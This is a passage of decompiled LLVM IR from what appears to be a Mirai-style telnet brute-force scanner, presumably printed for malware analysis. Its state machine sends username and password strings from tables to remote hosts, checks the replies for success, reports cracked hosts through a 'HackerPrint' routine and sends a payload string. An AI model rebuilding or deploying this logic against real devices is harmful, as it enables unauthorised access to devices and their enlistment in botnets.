  store i8 0, i8* %v3_ec7c, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_ec84:                                ; preds = %dec_label_pc_ec20
  %v3_eca8 = inttoptr i32 %v2_eca0 to i8*
  store i8 3, i8* %v3_eca8, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_ecb0:                                ; preds = %dec_label_pc_ebbc
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_ecd0 = load i32, i32* %v1_e264, align 4
  %v1_ecd4 = add i32 %v2_ecd0, 6
  store i32 %v1_ecd4, i32* @r4, align 4
  %v2_ecdc = call i32 @__GI_time(i32* null)
  %v0_ece4 = load i32, i32* @r4, align 4
  %v3_ece4 = icmp ult i32 %v0_ece4, %v2_ecdc
  br i1 %v3_ece4, label %dec_label_pc_ecec, label %dec_label_pc_f7d8

dec_label_pc_ecec:                                ; preds = %dec_label_pc_ecb0
  %v2_ed08 = add i32 %v2_e25c, 8
  %v3_ed10 = inttoptr i32 %v2_ed08 to i8*
  store i8 0, i8* %v3_ed10, align 4
  store i32 %v2_ed08, i32* %r2.global-to-local, align 4
  %v3_ed38 = add i32 %v2_e25c, 9
  %v4_ed38 = inttoptr i32 %v3_ed38 to i8*
  store i8 1, i8* %v4_ed38, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_ed40:                                ; preds = %dec_label_pc_e2a8
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v1_ed58 = inttoptr i32 %v2_e25c to i32*
  %v2_ed58 = load i32, i32* %v1_ed58, align 4
  store i32 %v2_ed58, i32* @r4, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_ed78 = add i32 %v2_e25c, 8
  %v1_ed7c = add i32 %v2_e25c, 10
  %v2_ed7c = inttoptr i32 %v1_ed7c to i8*
  %v3_ed7c = load i8, i8* %v2_ed7c, align 2
  %v4_ed7c = zext i8 %v3_ed7c to i32
  store i32 %v4_ed7c, i32* %r2.global-to-local, align 4
  %v4_ed88 = mul nuw nsw i32 %v4_ed7c, 4
  %v5_ed88 = add i32 %v4_ed88, ptrtoint ([45 x i8*]* @global_var_2e0b4.523 to i32)
  %v6_ed88 = inttoptr i32 %v5_ed88 to i32*
  %v7_ed88 = load i32, i32* %v6_ed88, align 4
  store i32 %v7_ed88, i32* @r5, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v3_edac = load i8, i8* %v2_ed7c, align 2
  %v4_edac = zext i8 %v3_edac to i32
  store i32 %v4_edac, i32* %r2.global-to-local, align 4
  %v4_edb8 = mul nuw nsw i32 %v4_edac, 4
  %v5_edb8 = add i32 %v4_edb8, ptrtoint ([45 x i8*]* @global_var_2e0b4.523 to i32)
  %v6_edb8 = inttoptr i32 %v5_edb8 to i32*
  %v7_edb8 = load i32, i32* %v6_edb8, align 4
  %v1_edbc = inttoptr i32 %v7_edb8 to i8*
  %v3_edc0 = call i32 @strlen(i8* %v1_edbc)
  %v0_edc8 = load i32, i32* @r4, align 4
  %v0_edcc = load i32, i32* @r5, align 4
  store i32 %v3_edc0, i32* %r2.global-to-local, align 4
  %v4_edd8 = call i32 @__libc_send(i32 %v0_edc8, i32 %v0_edcc, i32 %v3_edc0, i32 16384)
  %v1_ede0 = icmp slt i32 %v4_edd8, 0
  br i1 %v1_ede0, label %dec_label_pc_ede8, label %dec_label_pc_ee3c

dec_label_pc_ede8:                                ; preds = %dec_label_pc_ed40
  %v3_ee0c = inttoptr i32 %v2_ed78 to i8*
  store i8 0, i8* %v3_ee0c, align 4
  store i32 %v2_ed78, i32* %r2.global-to-local, align 4
  %v3_ee34 = add i32 %v2_e25c, 9
  %v4_ee34 = inttoptr i32 %v3_ee34 to i8*
  store i8 1, i8* %v4_ee34, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_ee3c:                                ; preds = %dec_label_pc_ed40
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_ee54 = load i32, i32* %v1_ed58, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_ee68 = call i32 @__libc_send(i32 %v2_ee54, i32 ptrtoint ([3 x i8]* @global_var_20bfc.525 to i32), i32 2, i32 16384)
  %v1_ee70 = icmp slt i32 %v5_ee68, 0
  store i32 %v2_ed78, i32* %r2.global-to-local, align 4
  br i1 %v1_ee70, label %dec_label_pc_ee78, label %dec_label_pc_eecc

dec_label_pc_ee78:                                ; preds = %dec_label_pc_ee3c
  %v3_ee9c = inttoptr i32 %v2_ed78 to i8*
  store i8 0, i8* %v3_ee9c, align 4
  store i32 %v2_ed78, i32* %r2.global-to-local, align 4
  %v3_eec4 = add i32 %v2_e25c, 9
  %v4_eec4 = inttoptr i32 %v3_eec4 to i8*
  store i8 1, i8* %v4_eec4, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_eecc:                                ; preds = %dec_label_pc_ee3c
  %v3_eef0 = inttoptr i32 %v2_ed78 to i8*
  store i8 4, i8* %v3_eef0, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_eef8:                                ; preds = %dec_label_pc_e2a8
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v1_ef10 = inttoptr i32 %v2_e25c to i32*
  %v2_ef10 = load i32, i32* %v1_ef10, align 4
  store i32 %v2_ef10, i32* %ip.global-to-local, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_ef30 = add i32 %v2_e258, %v2_ea3c
  %v1_ef34 = inttoptr i32 %v2_ef30 to i32*
  %v2_ef34 = load i32, i32* %v1_ef34, align 4
  store i32 %v2_ef34, i32* %r2.global-to-local, align 4
  %v1_ef3c = load i32, i32* @sp, align 4
  %v2_ef3c = inttoptr i32 %v1_ef3c to i32*
  store i32 ptrtoint (i32* @global_var_2e168 to i32), i32* %v2_ef3c, align 4
  %v0_ef40 = load i32, i32* %ip.global-to-local, align 4
  %v4_ef4c = inttoptr i32 %v2_ef34 to i8*
  %v5_ef4c = call i32 @read_until_response(i32 %v0_ef40, i32 10, i8* %v4_ef4c, i32 1024)
  %v2_ef54 = icmp eq i32 %v5_ef4c, 0
  br i1 %v2_ef54, label %dec_label_pc_efec, label %dec_label_pc_ef5c

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_eef8
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_ef7c = load i32, i32* %v1_ef34, align 4
  %v3_ef84 = call i32 @contains_fail(i32 %v2_ef7c, i32 %v3_e160, i32 %v3_e250)
  %v2_ef8c = icmp eq i32 %v3_ef84, 0
  %v2_efdc = add i32 %v2_e25c, 8
  store i32 %v2_efdc, i32* %r2.global-to-local, align 4
  br i1 %v2_ef8c, label %dec_label_pc_efc0, label %dec_label_pc_ef94

dec_label_pc_ef94:                                ; preds = %dec_label_pc_ef5c
  %v3_efb8 = inttoptr i32 %v2_efdc to i8*
  store i8 0, i8* %v3_efb8, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_efc0:                                ; preds = %dec_label_pc_ef5c
  %v3_efe4 = inttoptr i32 %v2_efdc to i8*
  store i8 5, i8* %v3_efe4, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_efec:                                ; preds = %dec_label_pc_eef8
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_f00c = load i32, i32* %v1_e264, align 4
  %v1_f010 = add i32 %v2_f00c, 6
  store i32 %v1_f010, i32* @r4, align 4
  %v2_f018 = call i32 @__GI_time(i32* null)
  %v0_f020 = load i32, i32* @r4, align 4
  %v3_f020 = icmp ult i32 %v0_f020, %v2_f018
  br i1 %v3_f020, label %dec_label_pc_f028, label %dec_label_pc_f7d8

dec_label_pc_f028:                                ; preds = %dec_label_pc_efec
  %v2_f044 = add i32 %v2_e25c, 8
  %v3_f04c = inttoptr i32 %v2_f044 to i8*
  store i8 0, i8* %v3_f04c, align 4
  store i32 %v2_f044, i32* %r2.global-to-local, align 4
  %v3_f074 = add i32 %v2_e25c, 9
  %v4_f074 = inttoptr i32 %v3_f074 to i8*
  store i8 1, i8* %v4_f074, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_f07c:                                ; preds = %dec_label_pc_e2a8
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v1_f094 = inttoptr i32 %v2_e25c to i32*
  %v2_f094 = load i32, i32* %v1_f094, align 4
  store i32 %v2_f094, i32* @r4, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_f0b4 = add i32 %v2_e25c, 8
  %v1_f0b8 = add i32 %v2_e25c, 11
  %v2_f0b8 = inttoptr i32 %v1_f0b8 to i8*
  %v3_f0b8 = load i8, i8* %v2_f0b8, align 1
  %v4_f0b8 = zext i8 %v3_f0b8 to i32
  store i32 %v4_f0b8, i32* %r2.global-to-local, align 4
  %v4_f0c4 = mul nuw nsw i32 %v4_f0b8, 4
  %v5_f0c4 = add i32 %v4_f0c4, ptrtoint ([23 x i8*]* @global_var_2e10c.527 to i32)
  %v6_f0c4 = inttoptr i32 %v5_f0c4 to i32*
  %v7_f0c4 = load i32, i32* %v6_f0c4, align 4
  store i32 %v7_f0c4, i32* @r5, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v3_f0e8 = load i8, i8* %v2_f0b8, align 1
  %v4_f0e8 = zext i8 %v3_f0e8 to i32
  store i32 %v4_f0e8, i32* %r2.global-to-local, align 4
  %v4_f0f4 = mul nuw nsw i32 %v4_f0e8, 4
  %v5_f0f4 = add i32 %v4_f0f4, ptrtoint ([23 x i8*]* @global_var_2e10c.527 to i32)
  %v6_f0f4 = inttoptr i32 %v5_f0f4 to i32*
  %v7_f0f4 = load i32, i32* %v6_f0f4, align 4
  %v1_f0f8 = inttoptr i32 %v7_f0f4 to i8*
  %v3_f0fc = call i32 @strlen(i8* %v1_f0f8)
  %v0_f104 = load i32, i32* @r4, align 4
  %v0_f108 = load i32, i32* @r5, align 4
  store i32 %v3_f0fc, i32* %r2.global-to-local, align 4
  %v4_f114 = call i32 @__libc_send(i32 %v0_f104, i32 %v0_f108, i32 %v3_f0fc, i32 16384)
  %v1_f11c = icmp slt i32 %v4_f114, 0
  br i1 %v1_f11c, label %dec_label_pc_f124, label %dec_label_pc_f178

dec_label_pc_f124:                                ; preds = %dec_label_pc_f07c
  %v3_f148 = inttoptr i32 %v2_f0b4 to i8*
  store i8 0, i8* %v3_f148, align 4
  store i32 %v2_f0b4, i32* %r2.global-to-local, align 4
  %v3_f170 = add i32 %v2_e25c, 9
  %v4_f170 = inttoptr i32 %v3_f170 to i8*
  store i8 1, i8* %v4_f170, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_f178:                                ; preds = %dec_label_pc_f07c
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_f190 = load i32, i32* %v1_f094, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_f1a4 = call i32 @__libc_send(i32 %v2_f190, i32 ptrtoint ([3 x i8]* @global_var_20bfc.525 to i32), i32 2, i32 16384)
  %v1_f1ac = icmp slt i32 %v5_f1a4, 0
  store i32 %v2_f0b4, i32* %r2.global-to-local, align 4
  br i1 %v1_f1ac, label %dec_label_pc_f1b4, label %dec_label_pc_f208

dec_label_pc_f1b4:                                ; preds = %dec_label_pc_f178
  %v3_f1d8 = inttoptr i32 %v2_f0b4 to i8*
  store i8 0, i8* %v3_f1d8, align 4
  store i32 %v2_f0b4, i32* %r2.global-to-local, align 4
  %v3_f200 = add i32 %v2_e25c, 9
  %v4_f200 = inttoptr i32 %v3_f200 to i8*
  store i8 1, i8* %v4_f200, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_f208:                                ; preds = %dec_label_pc_f178
  %v3_f22c = inttoptr i32 %v2_f0b4 to i8*
  store i8 6, i8* %v3_f22c, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_f234:                                ; preds = %dec_label_pc_e2a8
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v1_f24c = inttoptr i32 %v2_e25c to i32*
  %v2_f24c = load i32, i32* %v1_f24c, align 4
  store i32 %v2_f24c, i32* %ip.global-to-local, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_f26c = add i32 %v2_e258, %v2_ea3c
  %v1_f270 = inttoptr i32 %v2_f26c to i32*
  %v2_f270 = load i32, i32* %v1_f270, align 4
  store i32 %v2_f270, i32* %r2.global-to-local, align 4
  %v1_f278 = load i32, i32* @sp, align 4
  %v2_f278 = inttoptr i32 %v1_f278 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_2e1b0.529 to i32), i32* %v2_f278, align 4
  %v0_f27c = load i32, i32* %ip.global-to-local, align 4
  %v4_f288 = inttoptr i32 %v2_f270 to i8*
  %v5_f288 = call i32 @read_until_response(i32 %v0_f27c, i32 10, i8* %v4_f288, i32 1024)
  %v2_f290 = icmp eq i32 %v5_f288, 0
  br i1 %v2_f290, label %dec_label_pc_f58c, label %dec_label_pc_f298

dec_label_pc_f298:                                ; preds = %dec_label_pc_f234
  store i32 %storemerge612, i32* @r4, align 4
  %v2_f2a0 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f2b4 = load i32, i32* @r4, align 4
  %v2_f2c0 = mul i32 %v0_f2b4, 28
  %v2_f2c8 = add i32 %v2_f5a4, %v2_f2c0
  %v2_f2cc = inttoptr i32 %v2_f2c8 to i32*
  store i32 %v2_f2a0, i32* %v2_f2cc, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_f2ec = add i32 %v2_e25c, 24
  %v1_f2f0 = inttoptr i32 %v2_f2ec to i32*
  %v2_f2f0 = load i32, i32* %v1_f2f0, align 4
  %v3_f2f8 = call i32 @contains_fail(i32 %v2_f2f0, i32 %v3_e160, i32 %v3_e250)
  %v2_f300 = icmp eq i32 %v3_f2f8, 0
  br i1 %v2_f300, label %dec_label_pc_f334, label %dec_label_pc_f308

dec_label_pc_f308:                                ; preds = %dec_label_pc_f298
  %v2_f324 = add i32 %v2_e25c, 8
  store i32 %v2_f324, i32* %r2.global-to-local, align 4
  %v3_f32c = inttoptr i32 %v2_f324 to i8*
  store i8 0, i8* %v3_f32c, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_f334:                                ; preds = %dec_label_pc_f298
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_f354 = load i32, i32* %v1_f2f0, align 4
  %v3_f35c = call i32 @contains_success(i32 %v2_f354, i32 %v3_e160, i32 %v3_e250)
  %v2_f364 = icmp eq i32 %v3_f35c, 0
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_f554 = add i32 %v2_e25c, 8
  br i1 %v2_f364, label %dec_label_pc_f538, label %dec_label_pc_f36c

dec_label_pc_f36c:                                ; preds = %dec_label_pc_f334
  %v1_f38c = add i32 %v2_e25c, 9
  %v2_f38c = inttoptr i32 %v1_f38c to i8*
  %v3_f38c = load i8, i8* %v2_f38c, align 1
  %v7_f390 = icmp eq i8 %v3_f38c, 2
  br i1 %v7_f390, label %dec_label_pc_f398, label %dec_label_pc_f3c4

dec_label_pc_f398:                                ; preds = %dec_label_pc_f36c
  store i32 %v2_f554, i32* %r2.global-to-local, align 4
  %v3_f3bc = inttoptr i32 %v2_f554 to i8*
  store i8 7, i8* %v3_f3bc, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_f3c4:                                ; preds = %dec_label_pc_f36c
  %v2_f3c8 = load i32, i32* @global_var_2e4e0.53, align 4
  store i32 %v2_f3c8, i32* @r4, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v3_f3e8 = call i32 @get_telstate_host(i32 %v2_e25c, i32 %v3_e160, i32 %v3_e250)
  store i32 %v3_f3e8, i32* %ip.global-to-local, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v1_f410 = add i32 %v2_e25c, 10
  %v2_f410 = inttoptr i32 %v1_f410 to i8*
  %v3_f410 = load i8, i8* %v2_f410, align 2
  %v4_f410 = zext i8 %v3_f410 to i32
  store i32 %v4_f410, i32* %r2.global-to-local, align 4
  %v4_f41c = mul nuw nsw i32 %v4_f410, 4
  %v5_f41c = add i32 %v4_f41c, ptrtoint ([45 x i8*]* @global_var_2e0b4.523 to i32)
  %v6_f41c = inttoptr i32 %v5_f41c to i32*
  %v7_f41c = load i32, i32* %v6_f41c, align 4
  store i32 %v7_f41c, i32* @lr, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v1_f440 = add i32 %v2_e25c, 11
  %v2_f440 = inttoptr i32 %v1_f440 to i8*
  %v3_f440 = load i8, i8* %v2_f440, align 1
  %v4_f440 = zext i8 %v3_f440 to i32
  store i32 %v4_f440, i32* %r2.global-to-local, align 4
  %v4_f44c = mul nuw nsw i32 %v4_f440, 4
  %v5_f44c = add i32 %v4_f44c, ptrtoint ([23 x i8*]* @global_var_2e10c.527 to i32)
  %v6_f44c = inttoptr i32 %v5_f44c to i32*
  %v7_f44c = load i32, i32* %v6_f44c, align 4
  %v1_f450 = load i32, i32* @sp, align 4
  %v2_f450 = inttoptr i32 %v1_f450 to i32*
  store i32 %v7_f44c, i32* %v2_f450, align 4
  %v0_f454 = load i32, i32* @r4, align 4
  %v0_f45c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f45c, i32* @r2, align 4
  %v2_f464 = call i32 @HackerPrint(i32 %v0_f454, i32 ptrtoint (i32* @global_var_20c00.532 to i32))
  %v2_f46c = load i32, i32* @global_var_2e4e0.53, align 4
  store i32 %v2_f46c, i32* @r4, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v3_f48c = call i32 @get_telstate_host(i32 %v2_e25c, i32 %v3_e160, i32 %v3_e250)
  store i32 %v3_f48c, i32* %ip.global-to-local, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v3_f4b4 = load i8, i8* %v2_f410, align 2
  %v4_f4b4 = zext i8 %v3_f4b4 to i32
  store i32 %v4_f4b4, i32* %r2.global-to-local, align 4
  %v4_f4c0 = mul nuw nsw i32 %v4_f4b4, 4
  %v5_f4c0 = add i32 %v4_f4c0, ptrtoint ([45 x i8*]* @global_var_2e0b4.523 to i32)
  %v6_f4c0 = inttoptr i32 %v5_f4c0 to i32*
  %v7_f4c0 = load i32, i32* %v6_f4c0, align 4
  store i32 %v7_f4c0, i32* @lr, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v3_f4e4 = load i8, i8* %v2_f440, align 1
  %v4_f4e4 = zext i8 %v3_f4e4 to i32
  store i32 %v4_f4e4, i32* %r2.global-to-local, align 4
  %v4_f4f0 = mul nuw nsw i32 %v4_f4e4, 4
  %v5_f4f0 = add i32 %v4_f4f0, ptrtoint ([23 x i8*]* @global_var_2e10c.527 to i32)
  %v6_f4f0 = inttoptr i32 %v5_f4f0 to i32*
  %v7_f4f0 = load i32, i32* %v6_f4f0, align 4
  %v1_f4f4 = load i32, i32* @sp, align 4
  %v2_f4f4 = inttoptr i32 %v1_f4f4 to i32*
  store i32 %v7_f4f0, i32* %v2_f4f4, align 4
  %v0_f4f8 = load i32, i32* @r4, align 4
  %v0_f500 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_f500, i32* @r2, align 4
  %v3_f508 = call i32 @HackerPrint(i32 %v0_f4f8, i32 ptrtoint ([16 x i8]* @global_var_20c6c.534 to i32))
  store i32 %v2_f554, i32* %r2.global-to-local, align 4
  %v3_f530 = inttoptr i32 %v2_f554 to i8*
  store i8 7, i8* %v3_f530, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_f538:                                ; preds = %dec_label_pc_f334
  %v3_f55c = inttoptr i32 %v2_f554 to i8*
  store i8 0, i8* %v3_f55c, align 4
  store i32 %v2_f554, i32* %r2.global-to-local, align 4
  %v3_f584 = add i32 %v2_e25c, 9
  %v4_f584 = inttoptr i32 %v3_f584 to i8*
  store i8 1, i8* %v4_f584, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_f58c:                                ; preds = %dec_label_pc_f234
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_f5a8 = add i32 %v2_e258, %v2_f5a4
  %v1_f5ac = inttoptr i32 %v2_f5a8 to i32*
  %v2_f5ac = load i32, i32* %v1_f5ac, align 4
  %v1_f5b0 = add i32 %v2_f5ac, 7
  store i32 %v1_f5b0, i32* @r4, align 4
  %v2_f5b8 = call i32 @__GI_time(i32* null)
  %v0_f5c0 = load i32, i32* @r4, align 4
  %v3_f5c0 = icmp ult i32 %v0_f5c0, %v2_f5b8
  br i1 %v3_f5c0, label %dec_label_pc_f5c8, label %dec_label_pc_f7d8

dec_label_pc_f5c8:                                ; preds = %dec_label_pc_f58c
  %v2_f5e4 = add i32 %v2_e25c, 8
  %v3_f5ec = inttoptr i32 %v2_f5e4 to i8*
  store i8 0, i8* %v3_f5ec, align 4
  store i32 %v2_f5e4, i32* %r2.global-to-local, align 4
  %v3_f614 = add i32 %v2_e25c, 9
  %v4_f614 = inttoptr i32 %v3_f614 to i8*
  store i8 1, i8* %v4_f614, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_f61c:                                ; preds = %dec_label_pc_e2a8
  store i32 %storemerge612, i32* @r4, align 4
  %v2_f624 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f638 = load i32, i32* @r4, align 4
  %v2_f644 = mul i32 %v0_f638, 28
  %v2_f64c = add i32 %v2_f5a4, %v2_f644
  %v2_f650 = inttoptr i32 %v2_f64c to i32*
  store i32 %v2_f624, i32* %v2_f650, align 4
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v1_f66c = inttoptr i32 %v2_e25c to i32*
  %v2_f66c = load i32, i32* %v1_f66c, align 4
  store i32 %v2_f66c, i32* @r4, align 4
  %v2_f674 = load i32, i32* bitcast ([703 x i8]** @global_var_2e164.536 to i32*), align 4
  store i32 %v2_f674, i32* @r5, align 4
  %v1_f680 = inttoptr i32 %v2_f674 to i8*
  %v3_f684 = call i32 @strlen(i8* %v1_f680)
  %v0_f68c = load i32, i32* @r4, align 4
  %v0_f690 = load i32, i32* @r5, align 4
  store i32 %v3_f684, i32* %r2.global-to-local, align 4
  %v5_f69c = call i32 @__libc_send(i32 %v0_f68c, i32 %v0_f690, i32 %v3_f684, i32 16384)
  %v1_f6a4 = icmp slt i32 %v5_f69c, 0
  br i1 %v1_f6a4, label %dec_label_pc_f6ac, label %dec_label_pc_f724

dec_label_pc_f6ac:                                ; preds = %dec_label_pc_f61c
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_f6c4 = load i32, i32* %v1_f66c, align 4
  %v3_f6cc = call i32 @sclose(i32 %v2_f6c4, i32 %v3_e160, i32 %v3_e250)
  %v2_f6ec = add i32 %v2_e25c, 8
  %v3_f6f4 = inttoptr i32 %v2_f6ec to i8*
  store i8 0, i8* %v3_f6f4, align 4
  store i32 %v2_f6ec, i32* %r2.global-to-local, align 4
  %v3_f71c = add i32 %v2_e25c, 9
  %v4_f71c = inttoptr i32 %v3_f71c to i8*
  store i8 1, i8* %v4_f71c, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_f724:                                ; preds = %dec_label_pc_f61c
  %v2_f740 = add i32 %v2_e25c, 8
  %v3_f748 = add i32 %v2_e25c, 9
  %v4_f748 = inttoptr i32 %v3_f748 to i8*
  store i8 3, i8* %v4_f748, align 1
  store i32 %v3_e250, i32* %r2.global-to-local, align 4
  %v2_f768 = add i32 %v2_e258, %v2_f5a4
  %v1_f76c = inttoptr i32 %v2_f768 to i32*
  %v2_f76c = load i32, i32* %v1_f76c, align 4
  %v1_f770 = add i32 %v2_f76c, 60
  store i32 %v1_f770, i32* @r4, align 4
  %v2_f778 = call i32 @__GI_time(i32* null)
  %v0_f780 = load i32, i32* @r4, align 4
  %v3_f780 = icmp ult i32 %v0_f780, %v2_f778
  br i1 %v3_f780, label %dec_label_pc_f788, label %dec_label_pc_f7d8

dec_label_pc_f788:                                ; preds = %dec_label_pc_f724
  %v3_f7ac = inttoptr i32 %v2_f740 to i8*
  store i8 0, i8* %v3_f7ac, align 4
  store i32 %v2_f740, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v4_f748, align 1
  br label %dec_label_pc_f7d8

dec_label_pc_f7d8:                                ; preds = %dec_label_pc_eb08, %dec_label_pc_ecb0, %dec_label_pc_efec, %dec_label_pc_f58c, %dec_label_pc_f724, %dec_label_pc_e2a8, %dec_label_pc_e55c, %dec_label_pc_f6ac, %dec_label_pc_f5c8, %dec_label_pc_f538, %dec_label_pc_f3c4, %dec_label_pc_f398, %dec_label_pc_f308, %dec_label_pc_f208, %dec_label_pc_f1b4, %dec_label_pc_f124, %dec_label_pc_f028, %dec_label_pc_efc0, %dec_label_pc_ef94, %dec_label_pc_eecc, %dec_label_pc_ee78, %dec_label_pc_ede8, %dec_label_pc_ecec, %dec_label_pc_ec84, %dec_label_pc_ec58, %dec_label_pc_eb44, %dec_label_pc_ea90, %dec_label_pc_e974, %dec_label_pc_e8fc, %dec_label_pc_e724, %dec_label_pc_e6d4, %dec_label_pc_e530, %dec_label_pc_e4d8, %dec_label_pc_f788
  %v1_f7dc = add nuw nsw i32 %storemerge612, 1
  %v5_f7f0 = icmp slt i32 %v1_f7dc, 1000
  br i1 %v5_f7f0, label %dec_label_pc_e244, label %dec_label_pc_e238

; uselistorder directives
  uselistorder i32 %v3_f684, { 1, 0 }
  uselistorder i32 %v2_f554, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v3_f0fc, { 1, 0 }
  uselistorder i32 %v2_f0b4, { 5, 2, 4, 3, 0, 1 }
  uselistorder i32 %v2_efdc, { 1, 0, 2 }
  uselistorder i32 %v3_edc0, { 1, 0 }
  uselistorder i32 %v2_ed78, { 5, 2, 4, 3, 0, 1 }
  uselistorder i32 %v2_eca0, { 1, 0, 2 }
  uselistorder i32 %v2_e98c, { 1, 0 }
  uselistorder i32* %v1_e7cc, { 4, 3, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 %storemerge711, { 1, 0 }
  uselistorder i32 %v0_e3b0, { 1, 0 }
  uselistorder i8* %v2_e318, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_e28c, { 1, 0 }
  uselistorder i32* %v1_e264, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_e25c, { 4, 5, 49, 50, 51, 38, 39, 40, 46, 41, 42, 45, 44, 43, 3, 47, 48, 34, 33, 36, 35, 37, 29, 30, 31, 32, 25, 24, 27, 26, 28, 20, 21, 22, 23, 17, 18, 15, 16, 11, 12, 13, 14, 19, 7, 1, 2, 8, 0, 10, 9, 6 }
  uselistorder i32 %v2_e258, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v3_e250, { 66, 64, 65, 63, 49, 62, 61, 59, 60, 58, 57, 55, 56, 54, 52, 53, 50, 51, 48, 47, 46, 45, 44, 43, 40, 41, 42, 39, 38, 37, 36, 35, 34, 31, 32, 33, 30, 29, 27, 28, 26, 24, 25, 23, 22, 20, 21, 19, 18, 17, 16, 9, 10, 8, 7, 6, 5, 4, 15, 14, 13, 12, 11, 3, 2, 1, 0 }
  uselistorder i32 %storemerge612, { 1, 4, 5, 7, 6, 3, 2, 0 }
  uselistorder i32 %v2_f5a4, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v2_e778, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_e220, { 1, 0, 2 }
  uselistorder i32 %storemerge514, { 1, 0 }
  uselistorder i32 %v3_e160, { 3, 7, 6, 5, 4, 8, 9, 12, 11, 10, 13, 0, 14, 1, 17, 18, 19, 16, 2, 15 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-344, { 1, 0, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 9, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 75, 74, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 117, 116 }
  uselistorder i32 (i32, i32, i32)* @get_telstate_host, { 1, 0 }
  uselistorder i32 35, { 1, 0 }
  uselistorder i32 ptrtoint ([23 x i8*]* @global_var_2e10c.527 to i32), { 2, 3, 0, 1 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_20bfc.525 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([45 x i8*]* @global_var_2e0b4.523 to i32), { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @contains_fail, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sclose, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f7d8, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_e78c, { 1, 0 }
  uselistorder label %dec_label_pc_e724, { 1, 0 }
  uselistorder label %dec_label_pc_e2a8, { 1, 0 }
  uselistorder label %dec_label_pc_e244, { 1, 0 }
  uselistorder label %dec_label_pc_e1a4, { 1, 0 }
}

